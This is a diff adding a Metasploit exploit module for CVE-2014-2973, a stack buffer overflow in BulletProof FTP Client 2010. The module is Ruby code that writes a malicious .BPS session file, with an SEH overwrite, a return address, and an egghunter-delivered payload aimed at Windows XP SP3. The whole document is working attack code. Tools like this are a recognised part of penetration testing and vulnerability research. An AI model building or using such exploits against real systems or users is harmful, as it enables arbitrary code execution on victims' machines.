@@ -1,0 +1,91 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::FILEFORMAT
+  include Msf::Exploit::Remote::Seh
+  include Msf::Exploit::Remote::Egghunter
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'BulletProof FTP Client BPS Buffer Overflow',
+      'Description'    => %q{
+          This module exploits a stack-based buffer overflow vulnerability in
+        BulletProof FTP Client 2010, caused by an overly long hostname.
+        By persuading the victim to open a specially-crafted .BPS file, a
+        remote attacker could execute arbitrary code on the system or cause
+        the application to crash. This module has been tested successfully on
+        Windows XP SP3.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Gabor Seljan'
+        ],
+      'References'     =>
+        [
+          [ 'EDB', '34162' ],
+          [ 'EDB', '34540' ],
+          [ 'EDB', '35449' ],
+          [ 'OSVDB', '109547' ],
+          [ 'CVE', '2014-2973' ],
+        ],
+      'DefaultOptions' =>
+        {
+          'ExitFunction' => 'process'
+        },
+      'Platform'       => 'win',
+      'Payload'        =>
+        {
+          'BadChars'   => "\x00\x0a\x0d\x1a",
+          'Space'      => 2000
+        },
+      'Targets'        =>
+        [
+          [ 'Windows XP SP3',
+            {
+              'Offset' => 89,
+              'Ret'    => 0x74c86a98  # POP EDI # POP ESI # RET [oleacc.dll]
+            }
+          ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Jul 24 2014',
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+      [
+        OptString.new('FILENAME', [ false, 'The file name.', 'msf.bps'])
+      ],
+    self.class)
+  end
+
+  def exploit
+    eggoptions = {
+      :checksum => true,
+      :eggtag => 'w00t'
+    }
+
+    hunter, egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)
+
+    sploit = "This is a BulletProof FTP Client Session-File and should not be modified directly.\r\n"
+    sploit << rand_text_alpha(target['Offset'])
+    sploit << generate_seh_record(target.ret)
+    sploit << hunter               + "\r\n"  # FTP Server HOST / IP
+    sploit << rand_text_numeric(5) + "\r\n"  # Port number
+    sploit << egg                  + "\r\n"  # Login name
+    sploit << rand_text_alpha(8)   + "\r\n"  # Login password
+
+    # Create the file
+    print_status("Creating '#{datastore['FILENAME']}' file...")
+    file_create(sploit)
+  end
+
+end
